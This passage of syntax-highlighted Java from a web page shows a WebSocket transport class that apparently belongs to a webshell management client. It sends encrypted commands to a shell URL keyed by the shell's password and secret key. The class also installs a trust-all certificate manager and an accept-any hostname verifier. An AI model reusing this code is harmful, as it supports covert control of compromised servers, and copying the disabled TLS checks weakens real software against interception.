class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocket</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">HostnameVerifier</span> <span class="variable">hostnameVerifier</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrustAnyHostnameVerifier</span>();  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Proxy proxy;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ShellEntity shellContext;  </span><br><span class="line">    <span class="keyword">private</span> CookieManager cookieManager;  </span><br><span class="line">    <span class="keyword">private</span> URI uri;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">requestMethod</span> <span class="operator">=</span> <span class="string">&quot;POST&quot;</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">connected</span> <span class="operator">=</span> <span class="literal">false</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebSocket</span><span class="params">(ShellEntity shellContext)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.shellContext = shellContext;  </span><br><span class="line">        <span class="built_in">this</span>.proxy = ApplicationContext.getProxy(<span class="built_in">this</span>.shellContext);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">Handshake</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(shellContext.getUrl());  </span><br><span class="line">            <span class="type">Proxy</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="built_in">this</span>.proxy;  </span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">            <span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="keyword">if</span> (proxy == <span class="literal">null</span>) &#123;  </span><br><span class="line">                    proxy = Proxy.NO_PROXY;  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="built_in">this</span>.socket = <span class="keyword">new</span> <span class="title class_">Socket</span>(proxy);  </span><br><span class="line">  </span><br><span class="line">                socket.connect(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(uri.getHost(), getPort(uri)), shellContext.getConnTimeout());  </span><br><span class="line">                socket.setSoTimeout(shellContext.getReadTimeout());  </span><br><span class="line">  </span><br><span class="line">                <span class="built_in">this</span>.inputStream = <span class="built_in">this</span>.socket.getInputStream();  </span><br><span class="line">                <span class="built_in">this</span>.outputStream = <span class="built_in">this</span>.socket.getOutputStream();  </span><br><span class="line">  </span><br><span class="line">                reader = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="built_in">this</span>.inputStream));  </span><br><span class="line">                writer = <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputStreamWriter</span>(<span class="built_in">this</span>.outputStream));  </span><br><span class="line">  </span><br><span class="line">                <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> generateWebSocketKey(<span class="built_in">this</span>.shellContext.getPassword()+<span class="built_in">this</span>.shellContext.getSecretKey());  </span><br><span class="line">                writer.write(<span class="string">&quot;GET &quot;</span> + uri.getRawPath() + (uri.getQuery() != <span class="literal">null</span> ? <span class="string">&quot;?&quot;</span> + uri.getQuery() : <span class="string">&quot;&quot;</span>) + <span class="string">&quot; HTTP/1.1\r\n&quot;</span>);  </span><br><span class="line">                writer.write(<span class="string">&quot;Host: &quot;</span> + uri.getHost() + <span class="string">&quot;:&quot;</span> + getPort(uri) + <span class="string">&quot;\r\n&quot;</span>);  </span><br><span class="line">                writer.write(<span class="string">&quot;Upgrade: websocket\r\n&quot;</span>);  </span><br><span class="line">                writer.write(<span class="string">&quot;Connection: Upgrade\r\n&quot;</span>);  </span><br><span class="line">                writer.write(<span class="string">&quot;Sec-WebSocket-Key: &quot;</span> + key + <span class="string">&quot;\r\n&quot;</span>);  </span><br><span class="line">                writer.write(<span class="string">&quot;Sec-WebSocket-Version: 13\r\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">                writer.write(<span class="string">&quot;\r\n&quot;</span>);  </span><br><span class="line">                writer.flush();  </span><br><span class="line">  </span><br><span class="line">                <span class="type">String</span> <span class="variable">statusLine</span> <span class="operator">=</span> reader.readLine();  </span><br><span class="line">                <span class="keyword">if</span> (statusLine == <span class="literal">null</span> || !statusLine.startsWith(<span class="string">&quot;HTTP/1.1 101&quot;</span>)) &#123;  </span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;WebSocket handshake failed: &quot;</span> + statusLine);  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">                Map&lt;String, List&lt;String&gt;&gt; responseHeaders = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">                String line;  </span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span> &amp;&amp; !line.isEmpty()) &#123;  </span><br><span class="line">                    <span class="type">int</span> <span class="variable">idx</span> <span class="operator">=</span> line.indexOf(<span class="string">&#x27;:&#x27;</span>);  </span><br><span class="line">                    <span class="keyword">if</span> (idx &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">                        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> line.substring(<span class="number">0</span>, idx).trim();  </span><br><span class="line">                        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> line.substring(idx + <span class="number">1</span>).trim();  </span><br><span class="line">                        responseHeaders.computeIfAbsent(name, k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(value);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">                <span class="built_in">this</span>.connected = <span class="literal">true</span>;  </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">                Log.error(<span class="string">&quot;WebSocket handshake error: &quot;</span> + e.getMessage());  </span><br><span class="line">                disconnect();  </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;  </span><br><span class="line"><span class="comment">//                    if (reader != null) reader.close();  </span></span><br><span class="line"><span class="comment">//                    if (writer != null) writer.close();  </span></span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> WebSocketResponse <span class="title function_">SendWebSocketConn</span><span class="params">(String urlString, String method, Map&lt;String, String&gt; header, <span class="type">byte</span>[] requestData, <span class="type">int</span> connTimeOut, <span class="type">int</span> readTimeOut, Proxy proxy)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="keyword">if</span> (!connected || <span class="built_in">this</span>.socket == <span class="literal">null</span> || !<span class="built_in">this</span>.socket.isConnected()) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;WebSocket not connected&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            sendWebSocketFrame(requestData);  </span><br><span class="line">            <span class="type">byte</span>[] response = readWebSocketFrame();  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WebSocketResponse</span>(<span class="built_in">this</span>.shellContext, <span class="number">200</span>, <span class="literal">null</span>, response);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            Log.error(<span class="string">&quot;WebSocket send error: &quot;</span> + e.getMessage());  </span><br><span class="line">            disconnect();  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WebSocketResponse</span>(<span class="built_in">this</span>.shellContext, <span class="number">500</span>, <span class="literal">null</span>, (<span class="string">&quot;Error: &quot;</span> + e.getMessage()).getBytes());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> WebSocketResponse <span class="title function_">sendWebSocketResponse</span><span class="params">(<span class="type">byte</span>[] requestData)</span> &#123;  </span><br><span class="line">        Map&lt;String, String&gt; header = <span class="built_in">this</span>.shellContext.getHeaders();  </span><br><span class="line">        <span class="type">int</span> <span class="variable">connTimeOut</span> <span class="operator">=</span> <span class="built_in">this</span>.shellContext.getConnTimeout();  </span><br><span class="line">        <span class="type">int</span> <span class="variable">readTimeOut</span> <span class="operator">=</span> <span class="built_in">this</span>.shellContext.getReadTimeout();  </span><br><span class="line">  </span><br><span class="line">        requestData = <span class="built_in">this</span>.shellContext.getCryptionModule().encode(requestData);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">left</span> <span class="operator">=</span> <span class="built_in">this</span>.shellContext.getReqLeft();  </span><br><span class="line">        <span class="type">String</span> <span class="variable">right</span> <span class="operator">=</span> <span class="built_in">this</span>.shellContext.getReqRight();  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.shellContext.isSendLRReqData()) &#123;  </span><br><span class="line">            <span class="type">byte</span>[] leftData = left.getBytes();  </span><br><span class="line">            <span class="type">byte</span>[] rightData = right.getBytes();  </span><br><span class="line">            requestData = (<span class="type">byte</span>[]) functions.concatArrays(functions.concatArrays(leftData, <span class="number">0</span>, (leftData.length &gt; <span class="number">0</span> ? leftData.length : <span class="number">1</span>) - <span class="number">1</span>, requestData, <span class="number">0</span>, requestData.length - <span class="number">1</span>), <span class="number">0</span>, leftData.length + requestData.length - <span class="number">1</span>, rightData, <span class="number">0</span>, (rightData.length &gt; <span class="number">0</span> ? rightData.length : <span class="number">1</span>) - <span class="number">1</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.SendWebSocketConn(<span class="built_in">this</span>.shellContext.getUrl(), <span class="built_in">this</span>.requestMethod, header, requestData, connTimeOut, readTimeOut, <span class="built_in">this</span>.proxy);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sendWebSocketFrame</span><span class="params">(<span class="type">byte</span>[] payload)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">byte</span>[] frame = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">10</span> + payload.length];  <span class="comment">// 最大头长度 10        int offset = 0;  </span></span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.shellContext.getCryption().contains(<span class="string">&quot;BASE64&quot;</span>)) &#123;  </span><br><span class="line">            frame[offset++] = (<span class="type">byte</span>) <span class="number">0x81</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.shellContext.getCryption().contains(<span class="string">&quot;RAW&quot;</span>)) &#123;  </span><br><span class="line">            frame[offset++] = (<span class="type">byte</span>) <span class="number">0x82</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> payload.length;  </span><br><span class="line">        <span class="type">boolean</span> <span class="variable">mask</span> <span class="operator">=</span> <span class="literal">true</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (length &lt;= <span class="number">125</span>) &#123;  </span><br><span class="line">            frame[offset++] = (<span class="type">byte</span>) ((mask ? <span class="number">0x80</span> : <span class="number">0</span>) | length);  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (length &lt; <span class="number">65536</span>) &#123;  </span><br><span class="line">            frame[offset++] = (<span class="type">byte</span>) ((mask ? <span class="number">0x80</span> : <span class="number">0</span>) | <span class="number">126</span>);  </span><br><span class="line">            frame[offset++] = (<span class="type">byte</span>) (length &gt;&gt; <span class="number">8</span>);  </span><br><span class="line">            frame[offset++] = (<span class="type">byte</span>) length;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            frame[offset++] = (<span class="type">byte</span>) ((mask ? <span class="number">0x80</span> : <span class="number">0</span>) | <span class="number">127</span>);  </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">56</span>; i &gt;= <span class="number">0</span>; i -= <span class="number">8</span>) &#123;  </span><br><span class="line">                frame[offset++] = (<span class="type">byte</span>) (length &gt;&gt; i);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] maskKey = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4</span>];  </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">SecureRandom</span>().nextBytes(maskKey);  </span><br><span class="line">        System.arraycopy(maskKey, <span class="number">0</span>, frame, offset, <span class="number">4</span>);  </span><br><span class="line">        offset += <span class="number">4</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;  </span><br><span class="line">            frame[offset + i] = (<span class="type">byte</span>) (payload[i] ^ maskKey[i % <span class="number">4</span>]);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        offset += length;  </span><br><span class="line">  </span><br><span class="line">        outputStream.write(frame, <span class="number">0</span>, offset);  </span><br><span class="line">        outputStream.flush();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] readWebSocketFrame() <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">frameBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();  </span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">65536</span>];  </span><br><span class="line">  </span><br><span class="line">        <span class="type">int</span> <span class="variable">totalRead</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">        <span class="keyword">while</span> (frameBuffer.size() &lt; <span class="number">2</span> &amp;&amp; totalRead != -<span class="number">1</span>) &#123;  </span><br><span class="line">            totalRead = inputStream.read(buffer);  </span><br><span class="line">            <span class="keyword">if</span> (totalRead &gt; <span class="number">0</span>) frameBuffer.write(buffer, <span class="number">0</span>, totalRead);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (frameBuffer.size() &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] frameHeader = frameBuffer.toByteArray();  </span><br><span class="line">        <span class="type">boolean</span> <span class="variable">mask</span> <span class="operator">=</span> (frameHeader[<span class="number">1</span>] &amp; <span class="number">0x80</span>) != <span class="number">0</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">payloadLength</span> <span class="operator">=</span> frameHeader[<span class="number">1</span>] &amp; <span class="number">0x7F</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">int</span> <span class="variable">lengthBytes</span> <span class="operator">=</span> <span class="number">0</span>;  </span><br><span class="line">        <span class="keyword">if</span> (payloadLength == <span class="number">126</span>) lengthBytes = <span class="number">2</span>;  </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (payloadLength == <span class="number">127</span>) lengthBytes = <span class="number">8</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">int</span> <span class="variable">maskKeyOffset</span> <span class="operator">=</span> <span class="number">2</span> + lengthBytes;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">totalNeedRead</span> <span class="operator">=</span> maskKeyOffset + (mask ? <span class="number">4</span> : <span class="number">0</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">while</span> (frameBuffer.size() &lt; totalNeedRead &amp;&amp; totalRead != -<span class="number">1</span>) &#123;  </span><br><span class="line">            totalRead = inputStream.read(buffer);  </span><br><span class="line">            <span class="keyword">if</span> (totalRead &gt; <span class="number">0</span>) frameBuffer.write(buffer, <span class="number">0</span>, totalRead);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (frameBuffer.size() &lt; totalNeedRead) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (payloadLength == <span class="number">126</span>) &#123;  </span><br><span class="line">            payloadLength = ((frameHeader[<span class="number">2</span>] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span>) | (frameHeader[<span class="number">3</span>] &amp; <span class="number">0xFF</span>);  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (payloadLength == <span class="number">127</span>) &#123;  </span><br><span class="line">            payloadLength = ((frameHeader[<span class="number">6</span>] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span>)  </span><br><span class="line">                    | ((frameHeader[<span class="number">7</span>] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span>)  </span><br><span class="line">                    | ((frameHeader[<span class="number">8</span>] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span>)  </span><br><span class="line">                    | (frameHeader[<span class="number">9</span>] &amp; <span class="number">0xFF</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">int</span> <span class="variable">dataStart</span> <span class="operator">=</span> maskKeyOffset + (mask ? <span class="number">4</span> : <span class="number">0</span>);  </span><br><span class="line">        <span class="type">int</span> <span class="variable">dataLength</span> <span class="operator">=</span> payloadLength;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">totalDataRead</span> <span class="operator">=</span> frameBuffer.size() - dataStart;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">while</span> (totalDataRead &lt; dataLength &amp;&amp; totalRead != -<span class="number">1</span>) &#123;  </span><br><span class="line">            totalRead = inputStream.read(buffer);  </span><br><span class="line">            <span class="keyword">if</span> (totalRead &gt; <span class="number">0</span>) &#123;  </span><br><span class="line">                frameBuffer.write(buffer, <span class="number">0</span>, totalRead);  </span><br><span class="line">                totalDataRead += totalRead;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">byte</span>[] fullFrame = frameBuffer.toByteArray();  </span><br><span class="line">        <span class="type">byte</span>[] data = <span class="keyword">new</span> <span class="title class_">byte</span>[dataLength];  </span><br><span class="line">        System.arraycopy(fullFrame, dataStart, data, <span class="number">0</span>, dataLength);  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (mask) &#123;  </span><br><span class="line">            <span class="type">byte</span>[] maskKey = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4</span>];  </span><br><span class="line">            System.arraycopy(fullFrame, maskKeyOffset, maskKey, <span class="number">0</span>, <span class="number">4</span>);  </span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;  </span><br><span class="line">                data[i] ^= maskKey[i % <span class="number">4</span>];  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> data;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">trustAllHttpsCertificates</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            TrustManager[] trustAllCerts = <span class="keyword">new</span> <span class="title class_">TrustManager</span>[<span class="number">1</span>];  </span><br><span class="line">            <span class="type">miTM</span> <span class="variable">tm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">miTM</span>();  </span><br><span class="line">            trustAllCerts[<span class="number">0</span>] = tm;  </span><br><span class="line">            <span class="type">SSLContext</span> <span class="variable">sc</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;SSL&quot;</span>);  </span><br><span class="line">            sc.init(<span class="literal">null</span>, trustAllCerts, <span class="keyword">new</span> <span class="title class_">SecureRandom</span>());  </span><br><span class="line">            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());  </span><br><span class="line">            <span class="type">SSLContext</span> <span class="variable">sc2</span> <span class="operator">=</span> SSLContext.getInstance(<span class="string">&quot;TLS&quot;</span>);  </span><br><span class="line">            sc2.init(<span class="literal">null</span>, trustAllCerts, <span class="keyword">new</span> <span class="title class_">SecureRandom</span>());  </span><br><span class="line">            HttpsURLConnection.setDefaultSSLSocketFactory(sc2.getSocketFactory());  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> URI <span class="title function_">getUri</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.uri == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="built_in">this</span>.uri = URI.create(<span class="built_in">this</span>.shellContext.getUrl());  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">                e.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.uri;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="title function_">getPort</span><span class="params">(URI uri)</span> &#123;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> uri.getPort();  </span><br><span class="line">        <span class="keyword">if</span> (port == -<span class="number">1</span>) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;wss&quot;</span>.equalsIgnoreCase(uri.getScheme()) || <span class="string">&quot;https&quot;</span>.equalsIgnoreCase(uri.getScheme())) &#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="number">443</span>;  </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">                <span class="keyword">return</span> <span class="number">80</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> port;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">disconnect</span><span class="params">()</span> &#123;  </span><br><span class="line">        connected = <span class="literal">false</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="keyword">if</span> (outputStream != <span class="literal">null</span>) outputStream.close();  </span><br><span class="line">            <span class="keyword">if</span> (inputStream != <span class="literal">null</span>) inputStream.close();  </span><br><span class="line">            <span class="keyword">if</span> (socket != <span class="literal">null</span> &amp;&amp; !socket.isClosed()) socket.close();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            Log.error(<span class="string">&quot;WebSocket disconnect error: &quot;</span> + e.getMessage());  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">generateWebSocketKey</span><span class="params">(String customKey)</span> &#123;  </span><br><span class="line">        <span class="type">byte</span>[] nonce;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (customKey != <span class="literal">null</span> &amp;&amp; !customKey.isEmpty()) &#123;  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);  </span><br><span class="line">                nonce = md.digest(customKey.getBytes(StandardCharsets.UTF_8));  </span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException e) &#123;  </span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;MD5 algorithm not found&quot;</span>, e);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            nonce = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">16</span>];  </span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">SecureRandom</span>().nextBytes(nonce);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().withoutPadding().encodeToString(nonce);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> CookieManager <span class="title function_">getCookieManager</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.cookieManager == <span class="literal">null</span>) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.cookieManager = <span class="keyword">new</span> <span class="title class_">CookieManager</span>();  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                <span class="type">String</span> <span class="variable">cookieStr</span> <span class="operator">=</span> <span 